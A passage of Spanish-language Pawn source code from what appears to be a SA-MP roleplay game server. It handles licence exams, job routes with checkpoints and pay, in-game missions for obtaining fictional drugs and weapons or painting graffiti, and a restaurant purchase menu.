			if(EnAutoEscuela[playerid] != 1){SendClientMessage(playerid, Rojo, "* No estás haciendo un examen de conducción."); RemovePlayerFromVehicle(playerid); return 1;}
			if(CheckPointAutoEscuela[playerid] != 0){return 1;}
			SendClientMessage(playerid, Blanco, "Realiza el recorrido pasando por los chekpoints.");
			SendClientMessage(playerid, Blanco, "No vayas a más de 70Km/h ni dañes el vehículo.");
			KillTimer(MaxTiempoAutoEscuelaTimer[playerid]);
			MaxTiempoAutoEscuelaTimer[playerid] = SetTimerEx("MaxTiempoAutoEscuela", 600000, false, "i", playerid);
			CheckPointAutoEscuela[playerid] = 0;
			SetPlayerCheckpoint(playerid, ChecksPracticoCoche[0][0], ChecksPracticoCoche[0][1], ChecksPracticoCoche[0][2], 5.0);
		}
		if(CocheAutoescuelaAvion(GetPlayerVehicleID(playerid))) //autoescuela pilotar
	    {
	        if(EnAutoEscuela[playerid] != 2){SendClientMessage(playerid, Rojo, "* No estás haciendo un examen de aviación."); RemovePlayerFromVehicle(playerid); return 1;}
	        if(CheckPointAutoEscuela[playerid] != 0){return 1;}
			SendClientMessage(playerid, Blanco, "Realiza el recorrido pasando por los chekpoints en menos de 5 minutos.");
			KillTimer(MaxTiempoAutoEscuelaTimer[playerid]);
			MaxTiempoAutoEscuelaTimer[playerid] = SetTimerEx("MaxTiempoAutoEscuela", 300000, false, "i", playerid);
			CheckPointAutoEscuela[playerid] = 0;
			SetPlayerCheckpoint(playerid, ChecksPracticoAvion[0][0], ChecksPracticoAvion[0][1], ChecksPracticoAvion[0][2], 5.0);
	    }
	    if(CocheAutoescuelaBarco(GetPlayerVehicleID(playerid))) //autoescuela navegar
	    {
	        if(EnAutoEscuela[playerid] != 3){SendClientMessage(playerid, Rojo, "* No estás haciendo un examen de navegación."); RemovePlayerFromVehicle(playerid); return 1;}
	        if(CheckPointAutoEscuela[playerid] != 0){return 1;}
			SendClientMessage(playerid, Blanco, "Realiza el recorrido pasando por los chekpoints en menos de 3 minutos y sin dañar la embarcación.");
			KillTimer(MaxTiempoAutoEscuelaTimer[playerid]);
			MaxTiempoAutoEscuelaTimer[playerid] = SetTimerEx("MaxTiempoAutoEscuela", 180000, false, "i", playerid);
			CheckPointAutoEscuela[playerid] = 0;
			SetPlayerRaceCheckpoint(playerid, 0, ChecksPracticoBarco[0][0], ChecksPracticoBarco[0][1], ChecksPracticoBarco[0][2], ChecksPracticoBarco[1][0], ChecksPracticoBarco[1][1], ChecksPracticoBarco[1][2], 5.0);
	    }
     	if(IsAPizzaBike(GetPlayerVehicleID(playerid))) //Pizzero
	 	{
	 	    if(PlayerInfo[playerid][pTrabajo] != 1){SendClientMessage(playerid, Rojo, "* No trabajas de pizzero."); RemovePlayerFromVehicle(playerid); return 1;}
	 	    if(Trabajando[playerid] == 0){SendClientMessage(playerid, Rojo, "* No estás trabajando. Utiliza '/Trabajar' primero."); RemovePlayerFromVehicle(playerid); return 1;}
	 	    SendClientMessage(playerid, Verde, "Entrega los pedidos llevando la moto a los checkpoints del minimapa.");
	 	    if(PizzaRepartida[playerid] == 0)
	 	    {
	 	    	new casarand = random(588)+1;
	 	    	SetPlayerCheckpoint(playerid, HouseInfo[casarand][hEntradaX], HouseInfo[casarand][hEntradaY], HouseInfo[casarand][hEntradaZ], 5.0);
	 	    	PizzaRepartida[playerid] ++;
	 	    }
	 	    KillTimer(TimerDejarTrabajar[playerid]);
	 		return 1;
	 	}
		if(IsASweeper(GetPlayerVehicleID(playerid))) //Barrendero
		{
		    if(PlayerInfo[playerid][pTrabajo] != 2){SendClientMessage(playerid, Rojo, "* No trabajas de barrendero."); RemovePlayerFromVehicle(playerid); return 1;}
		    if(Trabajando[playerid] == 0){SendClientMessage(playerid, Rojo, "* No estás trabajando. Utiliza '/Trabajar' primero."); RemovePlayerFromVehicle(playerid); return 1;}
	 	    SendClientMessage(playerid, Verde, "Pasa por los checkpoint del minimapa con el limpiacalles para barrer esas zonas.");
	 	    if(CalleBarrida[playerid] == 0)
	 	    {
	 	    	new rand = random(sizeof(ChecksBarrendero));
	 	    	SetPlayerCheckpoint(playerid, ChecksBarrendero[rand][0], ChecksBarrendero[rand][1], ChecksBarrendero[rand][2], 5.0);
	 	    	CalleBarrida[playerid] ++;
	 	    }
	 	    KillTimer(TimerDejarTrabajar[playerid]);
			return 1;
		}
		if(IsASecuricar(GetPlayerVehicleID(playerid))) //Securicar
		{
		    if(PlayerInfo[playerid][pTrabajo] != 3){SendClientMessage(playerid, Rojo, "* No trabajas de securicar."); RemovePlayerFromVehicle(playerid); return 1;}
		    if(Trabajando[playerid] == 0){SendClientMessage(playerid, Rojo, "* No estás trabajando. Utiliza '/Trabajar' primero."); RemovePlayerFromVehicle(playerid); return 1;}
	 	    SendClientMessage(playerid, Verde, "Ve a los cajeros marcados en el minimapa para reponerlos.");
	 	    if(CajeroRepuesto[playerid] == 0)
	 	    {
	 	    	new rand = random(sizeof(Cajeros));
	 	    	SetPlayerCheckpoint(playerid, Cajeros[rand][cX], Cajeros[rand][cY], Cajeros[rand][cZ], 5.0);
	 	    	CajeroRepuesto[playerid] ++;
	 	    }
	 	    KillTimer(TimerDejarTrabajar[playerid]);
			return 1;
		}
		if(IsACombine(GetPlayerVehicleID(playerid)))
		{
		    if(PlayerInfo[playerid][pTrabajo] != 4){SendClientMessage(playerid, Rojo, "* No trabajas de cosechador."); RemovePlayerFromVehicle(playerid); return 1;}
		    if(Trabajando[playerid] == 0){SendClientMessage(playerid, Rojo, "* No estás trabajando. Utiliza '/Trabajar' primero."); RemovePlayerFromVehicle(playerid); return 1;}
	 	    SendClientMessage(playerid, Verde, "Pasa por los checkpoints con la cosechadora.");
	 	    if(Cosechado[playerid] == 0)
	 	    {
	 	    	new rand = random(sizeof(ChecksCosechador));
	 	    	SetPlayerCheckpoint(playerid, ChecksCosechador[rand][0], ChecksCosechador[rand][1], ChecksCosechador[rand][2], 5.0);
	 	    	Cosechado[playerid] ++;
	 	    }
	 	    KillTimer(TimerDejarTrabajar[playerid]);
			return 1;
		}
		if(IsACropduster(GetPlayerVehicleID(playerid)))
		{
		    if(PlayerInfo[playerid][pTrabajo] != 5){SendClientMessage(playerid, Rojo, "* No trabajas de fumigador aéreo."); RemovePlayerFromVehicle(playerid); return 1;}
		    if(Trabajando[playerid] == 0){SendClientMessage(playerid, Rojo, "* No estás trabajando. Utiliza '/Trabajar' primero."); RemovePlayerFromVehicle(playerid); return 1;}
	 	    SendClientMessage(playerid, Verde, "Pasa por los checkpoints con el avión.");
	 	    SendClientMessage(playerid, Verde, "Si sales de la zona de fumigación dejarás de trabajar.");
	 	    if(Fumigado[playerid] == 0)
	 	    {
	 	    	new rand = random(sizeof(ChecksFumigador));
	 	    	SetPlayerRaceCheckpoint(playerid, 4, ChecksFumigador[rand][0], ChecksFumigador[rand][1], ChecksFumigador[rand][2], 0.0, 0.0, 0.0, 5.0);
	 	    	Fumigado[playerid] ++;
	 	    }
	 	    KillTimer(TimerDejarTrabajar[playerid]);
			return 1;
		}
		if(IsATaxi(GetPlayerVehicleID(playerid)))
		{
		    if(PlayerInfo[playerid][pTrabajo] != 6){SendClientMessage(playerid, Rojo, "* No eres taxista."); RemovePlayerFromVehicle(playerid); return 1;}
		    if(Trabajando[playerid] == 0){SendClientMessage(playerid, Rojo, "* No estás de servicio. Utiliza '/Trabajar' primero."); RemovePlayerFromVehicle(playerid); return 1;}
			return 1;
		}
		if(IsABarcoPesca(GetPlayerVehicleID(playerid))) //Pescador
	 	{
	 	    if(PlayerInfo[playerid][pTrabajo] != 9){SendClientMessage(playerid, Rojo, "* No trabajas de pescador."); RemovePlayerFromVehicle(playerid); return 1;}
	 	    if(Trabajando[playerid] == 0){SendClientMessage(playerid, Rojo, "* No estás trabajando. Utiliza '/Trabajar' primero."); RemovePlayerFromVehicle(playerid); return 1;}
	 	    SendClientMessage(playerid, Verde, "Ve a los puntos de pesca a ver qué encuentras. Con un poco de suerte conseguirás una buena pesca.");
	 	    if(PescaRecogida[playerid] == 0)
	 	    {
	 	    	new rand = random(sizeof(ChecksPescador));
	 	    	SetPlayerCheckpoint(playerid, ChecksPescador[rand][0], ChecksPescador[rand][1], ChecksPescador[rand][2], 5.0);
	 	    	PescaRecogida[playerid] ++;
	 	    }
	 	    KillTimer(TimerDejarTrabajar[playerid]);
	 		return 1;
	 	}
	}
	return 1;
}

public OnPlayerEnterCheckpoint(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 5.0, 2274.1028,-2345.5371,13.5469) || IsPlayerInRangeOfPoint(playerid, 8.0, 2294.3999000,-2447.8000500,0.0000000) || IsPlayerInRangeOfPoint(playerid, 8.0, 2286.8096,-2423.5090,3.0000)){DisablePlayerCheckpoint(playerid); return 1;} //Depósito Ocean Docks
	else if(LocalizarVeh[playerid] > 0){SendClientMessage(playerid, Amarillo, "Gracias por usar nuestro sistema de rastreo de vehículos por GPS."); LocalizarVeh[playerid] = 0; DisablePlayerCheckpoint(playerid); return 1;}
    else if(AtendiendoInforme[playerid] != NOEXISTE) //Informes LSED
	{
	    for(new i = 0; i < MAX_LSEDINFORMES; i++)
		{
			if(InformeEmergencias[i][ieJugador] == AtendiendoInforme[playerid])
			{
				KillTimer(InformeEmergencias[i][ieTimer]);
				InformeEmergencias[i][ieEstado] = NOEXISTE;
				InformeEmergencias[i][ieJugador] = NOEXISTE;
				break;
			}
		}
		DisablePlayerCheckpoint(playerid);
	}
	else if(EnAutoEscuela[playerid] == 1 && CocheAutoescuelaCond(GetPlayerVehicleID(playerid))) //Autoescuela conducción
	{
	    SetCheckPointAutoescuela(playerid);
	    if(CheckPointAutoEscuela[playerid] >= 25)
	    {
	        new Float:cVida, coche;
			coche = GetPlayerVehicleID(playerid);
	        GetVehicleHealth(coche, cVida);
	        if(cVida < 900) //Si el vehículo tiene más de 10% de daños
			{
				SendClientMessage(playerid, Rojo, "* Has dañado demasiado el vehículo y has suspendido.");
				KillTimer(MaxTiempoAutoEscuelaTimer[playerid]);
				GameTextForPlayer(playerid, "~r~Suspenso", 1000, 6);
				GivePlayerMoneyAC(playerid, -100);
				CheckPointAutoEscuela[playerid] = 0;
				EnAutoEscuela[playerid] = 0;
                SetVehicleToRespawn(coche);
                DisablePlayerCheckpoint(playerid);
                return 1;
			}
			SendClientMessage(playerid, Verde, "Parte práctica aprobada.");
			SendClientMessage(playerid, Amarillo, "Has conseguido superar el examen de conducción.");
			SendClientMessage(playerid, Amarillo, "Ahora tienes tu licencia de conducción por 700$.");
			KillTimer(MaxTiempoAutoEscuelaTimer[playerid]);
			PlayerInfo[playerid][pLicConduccion] = 1;
			GivePlayerMoneyAC(playerid, -700);
			CheckPointAutoEscuela[playerid] = 0;
			EnAutoEscuela[playerid] = 0;
            SetVehicleToRespawn(coche);
            DisablePlayerCheckpoint(playerid);
            return 1;
	    }
	}
	else if(EnAutoEscuela[playerid] == 2 && CocheAutoescuelaAvion(GetPlayerVehicleID(playerid))) //Autoescuela aviación
	{
	    if(CheckPointAutoEscuela[playerid] == 0 || CheckPointAutoEscuela[playerid] >= 17){SetCheckPointAutoescuela(playerid);}
	    if(CheckPointAutoEscuela[playerid] >= 20)
	    {
	        new coche;
			coche = GetPlayerVehicleID(playerid);
			SendClientMessage(playerid, Verde, "Examen aprobado.");
			SendClientMessage(playerid, Amarillo, "Has conseguido superar el examen de aviación.");
			SendClientMessage(playerid, Amarillo, "Ahora tienes tu licencia de aviación por 7000$.");
			KillTimer(MaxTiempoAutoEscuelaTimer[playerid]);
			PlayerInfo[playerid][pLicAviacion] = 1;
			GivePlayerMoneyAC(playerid, -7000);
			CheckPointAutoEscuela[playerid] = 0;
			EnAutoEscuela[playerid] = 0;
            SetVehicleToRespawn(coche);
            DisablePlayerCheckpoint(playerid);
            return 1;
	    }
	}
	else if(Trabajando[playerid] == 1) //Trabajando
	{
	    if(PlayerInfo[playerid][pTrabajo] == 1 && IsAPizzaBike(GetPlayerVehicleID(playerid))) //Pizero
	    {
	        if(PizzaRepartida[playerid] < 8)
	 	    {
	 	        SendClientMessage(playerid, Verde, "Has entregado una pizza. Ve a la siguiente casa.");
	 	    	new casarand = random(588)+1;
	 	    	SetPlayerCheckpoint(playerid, HouseInfo[casarand][hEntradaX], HouseInfo[casarand][hEntradaY], HouseInfo[casarand][hEntradaZ], 5.0);
	 	    	PizzaRepartida[playerid] ++;
	 	    	return 1;
	 	    }
	 	    if(PizzaRepartida[playerid] == 8)
	 	    {
	 	        SendClientMessage(playerid, Verde, "Has entregado la última pizza. Vuelve para recibir tu paga.");
	 	        SetPlayerCheckpoint(playerid, 2115.5234,-1778.9923,13.1571, 5.0);
	 	        PizzaRepartida[playerid] ++;
	 	        return 1;
	 	    }
	 	    if(PizzaRepartida[playerid] > 8)
	 	    {
	 	        SendClientMessage(playerid, Verde, "Has recibido 350$ por tu trabajo.");
	 	        GivePlayerMoneyAC(playerid, 350);
	 	        PizzaRepartida[playerid] = 0;
	 	        SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
	 	        Trabajando[playerid] = 0;
	 	        SetVehicleToRespawn(GetPlayerVehicleID(playerid));
	 	        DisablePlayerCheckpoint(playerid);
	 	        PlayerInfo[playerid][pEsperaTrabajar] += 20;
				return 1;
	 	    }
	    }
	    if(PlayerInfo[playerid][pTrabajo] == 2 && IsASweeper(GetPlayerVehicleID(playerid))) //Barrendero
	    {
	        if(CalleBarrida[playerid] < 8)
	 	    {
	 	        SendClientMessage(playerid, Verde, "Ve a la siguiente zona para seguir barriendo.");
	 	    	new rand = random(sizeof(ChecksBarrendero));
	 	    	SetPlayerCheckpoint(playerid, ChecksBarrendero[rand][0], ChecksBarrendero[rand][1], ChecksBarrendero[rand][2], 5.0);
	 	    	CalleBarrida[playerid] ++;
	 	    	return 1;
	 	    }
	 	    if(CalleBarrida[playerid] == 8)
	 	    {
	 	        SendClientMessage(playerid, Verde, "Ya has barrido suficiente. Vuelve para recibir tu paga.");
	 	        SetPlayerCheckpoint(playerid, 1620.2510,-1888.7521,13.5481, 5.0);
	 	        CalleBarrida[playerid] ++;
	 	        return 1;
	 	    }
	 	    if(CalleBarrida[playerid] > 8)
	 	    {
	 	        SendClientMessage(playerid, Verde, "Has recibido 400$ por tu trabajo.");
	 	        GivePlayerMoneyAC(playerid, 400);
	 	        CalleBarrida[playerid] = 0;
	 	        SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
	 	        Trabajando[playerid] = 0;
	 	        SetVehicleToRespawn(GetPlayerVehicleID(playerid));
	 	        DisablePlayerCheckpoint(playerid);
	 	        PlayerInfo[playerid][pEsperaTrabajar] += 30;
				return 1;
	 	    }
	    }
	    if(PlayerInfo[playerid][pTrabajo] == 3 && IsASecuricar(GetPlayerVehicleID(playerid))) //Securicar
	    {
	        if(CajeroRepuesto[playerid] > 7)
	 	    {
	 	        SendClientMessage(playerid, Verde, "Has recibido 450$ por tu trabajo.");
	 	        GivePlayerMoneyAC(playerid, 450);
	 	        CajeroRepuesto[playerid] = 0;
	 	        SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
	 	        Trabajando[playerid] = 0;
	 	        SetVehicleToRespawn(GetPlayerVehicleID(playerid));
	 	        DisablePlayerCheckpoint(playerid);
	 	        PlayerInfo[playerid][pEsperaTrabajar] += 40;
				return 1;
	 	    }
	        TogglePlayerControllable(playerid, 0);
	        GameTextForPlayer(playerid, "~r~Reponiendo cajero", 10000, 3);
	        SetTimerEx("ReponerCajero", 10000, false, "i", playerid);
	        return 1;
	    }
	    if(PlayerInfo[playerid][pTrabajo] == 4 && IsACombine(GetPlayerVehicleID(playerid))) //Cosechador
	    {
	        if(Cosechado[playerid] < 16)
	 	    {
	 	    	new rand = random(sizeof(ChecksCosechador));
	 	    	SetPlayerCheckpoint(playerid, ChecksCosechador[rand][0], ChecksCosechador[rand][1], ChecksCosechador[rand][2], 5.0);
	 	    	Cosechado[playerid] ++;
	 	    	return 1;
	 	    }
	 	    if(Cosechado[playerid] == 16)
	 	    {
	 	        SendClientMessage(playerid, Verde, "Ya has cosechado suficiente. Vuelve para recibir tu paga.");
	 	        SetPlayerCheckpoint(playerid, -389.8043,-1476.0060,25.7266, 5.0);
	 	        Cosechado[playerid] ++;
	 	        return 1;
	 	    }
	 	    if(Cosechado[playerid] > 16)
	 	    {
	 	        SendClientMessage(playerid, Verde, "Has recibido 450$ por tu trabajo.");
	 	        GivePlayerMoneyAC(playerid, 450);
	 	        Cosechado[playerid] = 0;
	 	        Trabajando[playerid] = 0;
	 	        SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
	 	        SetVehicleToRespawn(GetPlayerVehicleID(playerid));
	 	        DisablePlayerCheckpoint(playerid);
	 	        PlayerInfo[playerid][pEsperaTrabajar] += 30;
				return 1;
	 	    }
	    }
	    if(PlayerInfo[playerid][pTrabajo] == 5 && IsACropduster(GetPlayerVehicleID(playerid))) //Fumigador aéreo
	    {
	        if(Fumigado[playerid] > 16)
	 	    {
	 	        SendClientMessage(playerid, Verde, "Has recibido 600$ por tu trabajo.");
	 	        GivePlayerMoneyAC(playerid, 600);
	 	        Fumigado[playerid] = 0;
	 	        Trabajando[playerid] = 0;
	 	        SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
	 	        SetVehicleToRespawn(GetPlayerVehicleID(playerid));
	 	        DisablePlayerCheckpoint(playerid);
	 	        PlayerInfo[playerid][pEsperaTrabajar] += 30;
				return 1;
	 	    }
	    }
	    if(PlayerInfo[playerid][pTrabajo] == 6 && IsATaxi(GetPlayerVehicleID(playerid))){DisablePlayerCheckpoint(playerid); return 1;} //Taxista
	    if(PlayerInfo[playerid][pTrabajo] == 9 && IsABarcoPesca(GetPlayerVehicleID(playerid))) //Pescador
	    {
	        new string[128];
     		if(PescaRecogida[playerid] > 11)
	 	    {
	 	        format(string, sizeof(string), "Has recibido %d$ por tu trabajo.", DineroPesca[playerid]);
	 	        SendClientMessage(playerid, Verde, string);
	 	        GivePlayerMoneyAC(playerid, DineroPesca[playerid]);
	 	        PescaRecogida[playerid] = 0;
	 	        DineroPesca[playerid] = 0;
	 	        Trabajando[playerid] = 0;
	 	        SetVehicleToRespawn(GetPlayerVehicleID(playerid));
	 	        DisablePlayerCheckpoint(playerid);
	 	        SetPlayerPos(playerid, Jobs[8][Jx], Jobs[8][Jy], Jobs[8][Jz]);
	 	        PlayerInfo[playerid][pEsperaTrabajar] += 40;
				return 1;
	 	    }
	        TogglePlayerControllable(playerid, 0);
	        GameTextForPlayer(playerid, "~r~Pescando...", 15000, 3);
	        DisablePlayerCheckpoint(playerid);
	        SetVehicleVelocity(GetPlayerVehicleID(playerid), 0, 0, 0);
	        SetTimerEx("Pescar", 15000, false, "i", playerid);
	        return 1;
	    }
	}
	else if(RealizandoMision[playerid] == 1) //Misión conseguir droga
	{
	    if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Debes tener una mano vacía."); return 1;}
	    new probabilidad = random(20), droga;
	    if(probabilidad > 10) //Semilla marihuana
		{
		    droga = 85;
		}
		if(probabilidad > 5) //Marihuana
		{
		    droga = 75;
		}
		else if(probabilidad > 3) //Crack
		{
		    droga = 77;
		}
		else if(probabilidad > 1) //cocaina
		{
		    droga = 76;
		}
		else //Heroína
		{
		    droga = 78;
		}
		new cantidad = 10 + random(20);
		if(PlayerInfo[playerid][pManoDer] == 0)
		{
		    PlayerInfo[playerid][pManoDer] = droga, PlayerInfo[playerid][pManoDerCant] = cantidad;
		    PonerObjeto(playerid, 1, droga);
		}
		else if(PlayerInfo[playerid][pManoIzq] == 0)
		{
		    PlayerInfo[playerid][pManoIzq] = droga, PlayerInfo[playerid][pManoIzqCant] = cantidad;
		    PonerObjeto(playerid, 2, droga);
		}
		ProxDetector(15.0, playerid, "Desconocido: Toma, haz lo que quieras con eso.", Chat1,Chat2,Chat3,Chat4,Chat5);
		RealizandoMision[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
		return 1;
	}
	else if(RealizandoMision[playerid] == 2) //Misión conseguir arma
	{
        if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Debes tener una mano vacía."); return 1;}
        new probabilidad = random(20), arma;
        if(probabilidad > 4) //M1911
		{
		    arma = 19;
		}
		else if(probabilidad > 3) //D. Eagle
		{
		    arma = 21;
		}
		else if(probabilidad > 1) //Tec-9
		{
		    arma = 29;
		}
		else //UZI
		{
		    arma = 25;
		}
		if(PlayerInfo[playerid][pManoDer] == 0)
		{
		    PlayerInfo[playerid][pManoDer] = arma, GivePlayerWeapon(playerid, ObjetoInfo[arma][IDArma], ObjetoInfo[arma][Capacidad]), PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[arma][Capacidad];
		    PonerObjeto(playerid, 1, arma);
		}
		else if(PlayerInfo[playerid][pManoIzq] == 0)
		{
		    PlayerInfo[playerid][pManoIzq] = arma, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[arma][Capacidad];
		    PonerObjeto(playerid, 2, arma);
		}
		ProxDetector(15.0, playerid, "Desconocido: Tírala, escóndela o haz lo que quieras. No nos hemos visto.", Chat1,Chat2,Chat3,Chat4,Chat5);
		RealizandoMision[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
	}
	else if(RealizandoMision[playerid] == 3) //Misión pintar
	{
	    if(PlayerInfo[playerid][pManoDer] != 34 && PlayerInfo[playerid][pManoIzq] != 34){SendClientMessage(playerid, Rojo, "* Necesitas un bote de spray con pintura para pintar el graffiti."); return 1;}
	    if(!((PlayerInfo[playerid][pManoDer] == 34 && PlayerInfo[playerid][pManoDerCant] > 0) || (PlayerInfo[playerid][pManoIzq] == 34 && PlayerInfo[playerid][pManoIzqCant] > 0))){SendClientMessage(playerid, Rojo, "* Necesitas un bote de spray con pintura para pintar el graffiti."); return 1;}
	    
	    if(PlayerInfo[playerid][pManoDer] == 34)
		{
		    if(PlayerInfo[playerid][pManoDerCant] > 50)
		    {
		  		GivePlayerWeapon(playerid, ObjetoInfo[PlayerInfo[playerid][pManoDer]][IDArma], -50), PlayerInfo[playerid][pManoDerCant] -= 50;
		    }
		    else
		    {
		    	RemovePlayerWeapon(playerid, ObjetoInfo[PlayerInfo[playerid][pManoDer]][IDArma]), PlayerInfo[playerid][pManoDerCant] = 0;
		    }
		}
		else if(PlayerInfo[playerid][pManoIzq] == 34)
		{
		    if(PlayerInfo[playerid][pManoIzqCant] > 50)
		    {
		  		PlayerInfo[playerid][pManoIzqCant] -= 50;
		    }
		    else
		    {
		    	RemovePlayerWeapon(playerid, ObjetoInfo[PlayerInfo[playerid][pManoIzq]][IDArma]), PlayerInfo[playerid][pManoIzqCant] = 0;
		    }
		}
		
	    new string[128];
	    format(string, sizeof(string), "* %s comienza a pintar un graffiti en el muro.", GetPlayerNameRP(playerid));
	    ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
	    SendClientMessage(playerid, Naranja, "* Utiliza '/DPintar' para dejar de pintar. Esto cancelará el recado.");
     	RealizandoMision[playerid] = 0;
	    DisablePlayerCheckpoint(playerid);
	    TogglePlayerControllable(playerid, 0);
	    SetTimerEx("PintarGraffiti", 20000, false, "i", playerid);
	    ApplyAnimation(playerid,"SPRAYCAN","spraycan_fire",4.1,1,1,1,1,22000,1);
	    new Float:posicion[3];
	    GetPlayerPos(playerid, posicion[0], posicion[1], posicion[2]);
	    for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i) && i != INVALID_PLAYER_ID)
			{
				if(PlayerInfo[i][pFaccion] == 1 && PlayerInfo[i][pServicioPD] > 0)
				{
					SetPlayerCheckpoint(i, posicion[0], posicion[1], posicion[2], 4.0);
					SendClientMessage(i, AguamarinaOscuro, "[Radio] Central: Una banda está haciendo pintadas por las calles. Acudan a la posición marcada.");
				}
			}
		}
	}
	else{DisablePlayerCheckpoint(playerid);}
	return 1;
}

public OnPlayerLeaveCheckpoint(playerid)
{
return 1;
}

public OnPlayerEnterRaceCheckpoint(playerid)
{
    if(EnAutoEscuela[playerid] == 2 && CocheAutoescuelaAvion(GetPlayerVehicleID(playerid))) //Autoescuela aviación
	{
	    if(CheckPointAutoEscuela[playerid] > 0 || CheckPointAutoEscuela[playerid] < 17){SetCheckPointAutoescuela(playerid);}
	}
	else if(EnAutoEscuela[playerid] == 3 && CocheAutoescuelaBarco(GetPlayerVehicleID(playerid))) //Autoescuela navegación
	{
	    if(CheckPointAutoEscuela[playerid] < 21){SetCheckPointAutoescuela(playerid);}
	    if(CheckPointAutoEscuela[playerid] >= 21)
	    {
	        new Float:cVida, coche;
			coche = GetPlayerVehicleID(playerid);
	        GetVehicleHealth(coche, cVida);
	        if(cVida < 900) //Si el vehículo tiene más de 10% de daños
			{
				SendClientMessage(playerid, Rojo, "* Has dañado demasiado el vehículo y has suspendido.");
				KillTimer(MaxTiempoAutoEscuelaTimer[playerid]);
				GameTextForPlayer(playerid, "~r~Suspenso", 1000, 6);
				GivePlayerMoneyAC(playerid, -100);
				CheckPointAutoEscuela[playerid] = 0;
				EnAutoEscuela[playerid] = 0;
                SetVehicleToRespawn(coche);
                DisablePlayerRaceCheckpoint(playerid);
                return 1;
			}
			SendClientMessage(playerid, Verde, "Examen aprobado.");
			SendClientMessage(playerid, Amarillo, "Has conseguido superar el examen de navegación.");
			SendClientMessage(playerid, Amarillo, "Ahora tienes tu licencia de navegación por 1000$.");
			KillTimer(MaxTiempoAutoEscuelaTimer[playerid]);
			PlayerInfo[playerid][pLicNavegacion] = 1;
			GivePlayerMoneyAC(playerid, -1000);
			CheckPointAutoEscuela[playerid] = 0;
			EnAutoEscuela[playerid] = 0;
            SetVehicleToRespawn(coche);
            DisablePlayerRaceCheckpoint(playerid);
	    }
	}
	else if(Trabajando[playerid] == 1)
	{
	    if(PlayerInfo[playerid][pTrabajo] == 5 && IsACropduster(GetPlayerVehicleID(playerid))) //Fumigador aéreo
	    {
	        if(Fumigado[playerid] < 16)
	 	    {
	 	    	new rand = random(sizeof(ChecksFumigador));
	 	    	SetPlayerRaceCheckpoint(playerid, 4, ChecksFumigador[rand][0], ChecksFumigador[rand][1], ChecksFumigador[rand][2], 0.0, 0.0, 0.0, 5.0);
	 	    	Fumigado[playerid] ++;
	 	    	return 1;
	 	    }
	 	    if(Fumigado[playerid] == 16)
	 	    {
	 	        DisablePlayerRaceCheckpoint(playerid);
	 	        SendClientMessage(playerid, Verde, "Ya has fumigado suficiente. Vuelve para recibir tu paga.");
	 	        SetPlayerCheckpoint(playerid, -420.8315,-1726.2134,8.8748, 5.0);
	 	        Fumigado[playerid] ++;
	 	        return 1;
	 	    }
	    }
	}
	else{DisablePlayerRaceCheckpoint(playerid);}
	return 1;
}

public OnPlayerLeaveRaceCheckpoint(playerid)
{
return 1;
}

public OnRconCommand(cmd[])
{
return 1;
}

public OnPlayerRequestSpawn(playerid)
{
return 1;
}

public OnObjectMoved(objectid)
{
return 1;
}

public OnPlayerObjectMoved(playerid, objectid)
{
return 1;
}

public OnPlayerPickUpPickup(playerid, pickupid)
{
return 1;
}

public OnVehicleMod(playerid, vehicleid, componentid)
{
return 1;
}

public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
return 1;
}

public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
return 1;
}

public OnPlayerSelectedMenuRow(playerid, row)
{
	new string[250];
	if(GetPlayerMenu(playerid) == restaurantes) //restaurantes
    {
        TogglePlayerControllable(playerid, 1);
        switch(row)
        {
            case 0: //Botella de cerveza
            {
                new precio = 15, objeto = 61;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(restaurantes, playerid);
            }
            case 1: //Copa de vino
            {
                new precio = 15, objeto = 62;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(restaurantes, playerid);
            }
            case 2: //Vaso de whisky
            {
